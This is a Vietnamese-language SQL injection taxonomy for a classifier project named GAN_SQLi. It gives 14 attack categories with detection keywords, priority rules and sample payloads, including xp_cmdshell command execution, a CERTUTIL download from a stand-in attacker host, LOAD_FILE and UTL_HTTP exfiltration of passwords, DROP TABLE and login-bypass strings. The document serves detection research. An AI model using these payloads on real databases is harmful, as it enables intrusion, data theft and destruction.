# SQLi Taxonomy — 14 Categories + Detection Signals

Tài liệu này định nghĩa 14 categories cho SQL injection classification
trong dự án GAN_SQLi. Mỗi category có:
- **Primary Signal**: keyword/pattern quyết định
- **Secondary Signals**: hỗ trợ xác nhận
- **Examples**: payload thật từ dataset
- **Priority**: khi 1 payload match nhiều category, ưu tiên số thấp hơn

---

## Priority Table (lower = ưu tiên hơn)

Khi 1 payload có dấu hiệu của nhiều categories, dùng priority này:

| Priority | Category | Lý do |
|----------|----------|-------|
| 1 | `rce` | Nguy hiểm nhất, cần ưu tiên |
| 2 | `out_of_band` | External interaction |
| 3 | `stacked_queries` | Multiple statements |
| 4 | `error_based` | Error message exploitation |
| 5 | `time_blind` | Time-based inference |
| 6 | `heavy_query` | CPU-intensive |
| 7 | `union_based` | UNION data extraction |
| 8 | `boolean_blind` | True/False inference |
| 9 | `auth_bypass` | Login bypass |
| 10 | `second_order` | Stored SQLi |
| 11 | `polyglot` | Cross-DB |
| 12 | `lateral` | JOIN-based |
| 13 | `benign` | Non-attack |
| 14 | `unknown` | Can't determine |

Ví dụ: payload có cả `xp_cmdshell` và `UNION SELECT` → chọn `rce` (priority 1).

---

## Category Details

### 1. `rce` — Remote Command Execution

**Primary Signal:** OS command execution functions

```
xp_cmdshell, certutil, powershell, cmd.exe, /bin/bash, exec master..xp_cmdshell
```

**Examples:**
```
'; exec master..xp_cmdshell 'whoami' --
1; CERTUTIL -URLOCATE http://attacker.com/payload.exe
```

**Priority:** 1 (cao nhất)

---

### 2. `out_of_band` — Out-of-Band / DNS Exfiltration

**Primary Signal:** External network calls từ database

```
LOAD_FILE(), UTL_HTTP, UTL_INADDR, UTL_FILE, BULK INSERT, xp_cmdshell,
xp_dirtree, OPENROWSET, OPENDATASOURCE, bcplogintime.csv, HTTP_MAKE_REQUEST
```

**Note:** Nếu có `xp_cmdshell` → ưu tiên `rce` hơn.

**Examples:**
```
1; SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
AND UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT password FROM users)) = 1
```

**Priority:** 2

---

### 3. `stacked_queries` — Stacked Queries

**Primary Signal:** Nhiều SQL statements trong 1 request

```
; (dấu chấm phẩy) kết thúc statement rồi bắt đầu statement mới
CREATE USER, CREATE TABLE, DROP TABLE, INSERT INTO, DELETE FROM
```

**Lưu ý:**
- Một `;` ở cuối payload KHÔNG phải stacked query (VD: `SELECT 1;`)
- Cần có statement mới sau dấu `;`

**Examples:**
```
'; CREATE USER attacker IDENTIFIED BY password --
1; INSERT INTO logs VALUES (1, 'x') --
```

**Priority:** 3

---

### 4. `error_based` — Error-Based SQLi

**Primary Signal:** Hàm gây lỗi có chứa subquery

```
EXTRACTVALUE(), UPDATEXML(), GTID_SUBSET(), GTID_SUBTRACT(),
utl_inaddr.get_host_address(), ctxsys.drithsx, dbms_pipe.receive_message,
convert(int, ...), CAST(... AS int), floor(rand(0)*2)
```

**Signatures theo DB:**

| DB | Functions |
|----|-----------|
| MySQL | `EXTRACTVALUE()`, `UPDATEXML()`, `GTID_SUBSET()`, `floor(rand()*2)` |
| Oracle | `utl_inaddr.get_host_address()`, `ctxsys.drithsx` |
| MSSQL | `convert(int, ...)`, `CAST(... AS int)` |

**Examples:**
```
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@VERSION)))
AND 1 = utl_inaddr.get_host_address((SELECT name FROM users))
```

**Priority:** 4

---

### 5. `time_blind` — Time-Based Blind SQLi

**Primary Signal:** Hàm gây delay

```
SLEEP(), pg_sleep(), WAITFOR DELAY, BENCHMARK(),
randomblob(), generate_series(), heavy_time_delay
```

**Signatures theo DB:**

| DB | Functions |
|----|-----------|
| MySQL | `SLEEP(N)`, `BENCHMARK(N, expr)` |
| PostgreSQL | `pg_sleep(N)`, `generate_series()` + heavy |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| SQLite | `randomblob(500000000/2)` |

**Examples:**
```
' AND SLEEP(5) --
1; WAITFOR DELAY '0:0:5' --
' AND pg_sleep(5) --
AND upper(hex(randomblob(500000000/2)))
```

**Priority:** 5

---

### 6. `heavy_query` — Heavy / CPU-Intensive Query

**Primary Signal:** Cross-join gây CPU high

```
COUNT(*) FROM table1, table2, table3, table4, ... (nhiều tables)
COUNT(*) CROSS JOIN nhiều lần
```

**Examples:**
```
AND (SELECT COUNT(*) FROM users A, users B, users C, users D) > 0
1 AND (SELECT COUNT(*) FROM sysibm.systables AS t1, sysibm.systables AS t2, sysibm.systables AS t3)
```

**Note:** `SELECT COUNT(*) FROM table1, table2` với 2 tables KHÔNG phải heavy.
Cần >= 3 tables hoặc kết hợp với subquery phức tạp.

**Priority:** 6

---

### 7. `union_based` — UNION-Based SQLi

**Primary Signal:** `UNION SELECT`, `UNION ALL SELECT`

```
UNION SELECT, UNION ALL SELECT, UNION (SELECT...)
```

**Lưu ý:**
- `UNION SELECT NULL` hoặc `UNION SELECT 1,2,3` cũng là union_based
- Ngay cả khi obfuscated (`UN/**/ION/**/SEL/**/ECT`) vẫn là union_based

**Examples:**
```
' UNION SELECT NULL --
' UNION SELECT 1, @@VERSION, database() --
' UNION SELECT table_name FROM information_schema.tables --
' UN/**/ION/**/SEL/**/ECT 1, version() --
```

**Priority:** 7

---

### 8. `boolean_blind` — Boolean-Based Blind SQLi

**Primary Signal:** True/False comparison (AND/OR + so sánh)

```
AND 1=1, OR 1=1, AND 'a'='a', OR 'x'='y'
OR '1'='1, AND 1=2, OR 'unusual'='unusual'
```

**Không phải boolean_blind nếu có:**
- UNION → `union_based`
- SLEEP → `time_blind`
- Error function → `error_based`
- xp_cmdshell → `rce`

**Examples:**
```
' AND '1'='1' --  (boolean_blind)
' OR '1'='1' --   (boolean_blind)
AND 1 = 1          (boolean_blind)
OR 'unusual' = 'unusual'  (boolean_blind)
```

**Note:** `or 1=1` (đơn giản, không quote) VẪN là boolean_blind.

**Priority:** 8

---

### 9. `auth_bypass` — Authentication Bypass

**Primary Signal:** Login bypass patterns

```
' OR '1'='1, admin' --, admin'#, admin"""
admin' OR '1'='1', ' OR 1=1-- -, " OR ""="
```

**Cần phân biệt với boolean_blind:**
- `auth_bypass` = payload được thiết kế để bypass login (thường có `admin`)
- `boolean_blind` = payload dùng comparison để infer thông tin

**Examples:**
```
admin' OR '1'='1
admin' --
admin""" OR ""1""=""1
' OR 1=1 --
```

**Priority:** 9

---

### 10. `second_order` — Second-Order / Stored SQLi

**Primary Signal:** INSERT payload và chờ trigger

```
INSERT INTO ... VALUES ...
```

**Lưu ý:** Rất khó detect từ static payload vì bản chất second-order
cần 2 requests: (1) insert độc hại, (2) trigger ở chỗ khác.
Nếu có `INSERT` + attack intent → đánh dấu second_order.

**Examples:**
```
' INSERT INTO comments VALUES ('x', 'normal text '); DROP TABLE users; --')
```

**Priority:** 10

---

### 11. `polyglot` — Polyglot / Cross-DBMS

**Primary Signal:** Payload hoạt động trên nhiều DB engines

```
SLEEP(1)/\*!*\/OR'|'
```

**Cách detect:**
1. Payload có thể parse được trên >= 2 DB engines
2. Payload chứa cả MySQL comment `/*!...*/` và PostgreSQL syntax
3. Hoặc syntax rất đơn giản, universal

**Examples:**
```
"'"'"'"'"'" UNION SELECT 1,2,3--
SLEEP(1)/*.*/OR'|'"
```

**Priority:** 11

---

### 12. `lateral` — Lateral / JOIN-Based Injection

**Primary Signal:** JOIN operations + injection

```
JOIN ... ON ... OR 1=1
LATERAL JOIN
```

**Examples:**
```
' JOIN users ON users.id = 1 OR '1'='1' --
```

**Priority:** 12

---

### 13. `benign` — Benign / Non-Attack

**Đây KHÔNG phải SQL injection.** Gồm 2 loại:

**Loại A — Legitimate SQL queries:**
```
SELECT * FROM users WHERE id = 1
PRINT 'Hello'
SELECT name FROM syscolumns
```

**Loại B — Plain text / English (negative samples từ sqliv2):**
```
administrator
distinct
insert
hello world
```

**Detection:**
- Không có intention tấn công
- Không có comparison manipulation
- Là SQL hợp lệ hoặc text thông thường

**Priority:** 13

---

### 14. `unknown` — Cannot Determine

**Khi nào dùng:**
1. Payload quá ngắn / vô nghĩa
2. Không match bất kỳ signature nào
3. Confidence < 0.5

**Không lạm dụng:** CHỈ dùng khi thực sự không thể xác định.

**Examples:**
```
? (chỉ có dấu hỏi)
1 (chỉ số 1)
a (chỉ chữ a)
```

**Priority:** 14

---

## DB Engine Detection Taxonomy (9 categories)

| DB | Primary Signatures | Example |
|----|-------------------|---------|
| `mysql` | `@@VERSION`, `LOAD_FILE()`, `SLEEP()`, `BENCHMARK()`, `database()`, `information_schema`, `/*!...*/` | `1 UNION SELECT @@VERSION` |
| `mssql` | `@@VERSION` (MSSQL context), `WAITFOR DELAY`, `sysobjects`, `xp_cmdshell`, `@@servername`, `master..sysdatabases` | `1; WAITFOR DELAY '0:0:5'--` |
| `oracle` | `utl_inaddr`, `ctxsys.drithsx`, `dual`, `all_tables`, `v$version`, `ROWNUM`, `USER$` | `AND 1 = utl_inaddr.get_host_address(...)` |
| `postgresql` | `pg_sleep()`, `version()`, `::` cast, `pg_catalog` | `' AND pg_sleep(5)--` |
| `sqlite` | `sqlite_version()`, `sqlite_master`, `randomblob(...)` | `AND randomblob(500000000/2)` |
| `firebird` | `rdb$...`, `rdb$functions`, `rdb$relations` (thực tế từ dữ liệu) | `rdb$functions as t4` |
| `db2` | `sysibm.systables` (thực tế từ dữ liệu) | `FROM sysibm.systables as t1` |
| `generic` | Không có DB-specific signature | `' OR '1'='1` |
| `unknown` | Không đủ thông tin | — |

### Lưu ý khi detect DB:
- `@@VERSION` tồn tại ở cả MySQL và MSSQL → cần context thêm
- `SLEEP()` là MySQL, `pg_sleep()` là PostgreSQL, `WAITFOR DELAY` là MSSQL
- `union select 1,version()` — `version()` là PostgreSQL hoặc MySQL
- `information_schema` — tồn tại ở nhiều DB, cần thêm signature phụ
